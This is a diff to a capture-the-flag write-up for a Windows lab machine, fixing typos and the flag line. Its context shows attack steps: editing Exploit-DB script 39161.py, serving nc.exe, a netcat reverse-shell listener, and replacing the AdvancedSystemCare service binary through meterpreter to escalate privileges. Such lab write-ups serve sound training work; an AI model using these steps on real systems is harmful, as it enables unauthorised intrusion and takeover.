@@ -84,7 +84,8 @@ Mode              Size  Type  Last modified              Name
 100666/rw-rw-rw-  282   fil   2019-09-27 07:07:07 -0400  desktop.ini
 100666/rw-rw-rw-  70    fil   2019-09-27 08:42:38 -0400  user.txt
 
-cat user.txt for answer. b0[REDACTED]65
+cat user.txt
+b0[REDACTED]65
 ```
 
 Additional enumeration done using the PowerUp.ps1 PowerShell script. 
@@ -367,7 +368,7 @@ Use script 39161.py from Exploit-db.com. Edit script:
 * Set local IP
 * Set local port
 Use a web server to transfer Netcat binary, *nc.exe*. 
-* `sudo python3 -m http.server 80 ` // Note that you must start web seerver with `sudo` or you get an error because you need a server running on port 80.
+* `sudo python3 -m http.server 80 ` // Note that you must start web seerver with `sudo` or you get an error because you need a server running on port 80. 
 Start a listener for the callback.
 * `nc -lvnp 4444`
 Fire the exploit script. 
@@ -393,9 +394,9 @@ Start PowerShell in meterpreter
 * `powershell_shell`
 * Stop service `Stop-Service AdvancedSystemCareService9`
 * Move into ASC directory `cd 'C:\Program Files (x86)\IObit\Advanced SystemCare'`
-* Renaming, moving, deleting the ASCService.exe didn't work. So I just tried to upload my version hoping it would overwrite the eisting file. It did! 
+* Renaming, moving, deleting the ASCService.exe didn't work. So I just tried to upload my version hoping it would overwrite the existing file. It did! 
 	* Exit out of PowerShell `CTRL-C`
-	* `upload ASCServie.exe`
+	* `upload ASCService.exe`
 	* File's last modified date didn't change but it was now the same size as my exploit. 
 * Start my listener `nc -lvnp 4444`
 * Restart the service
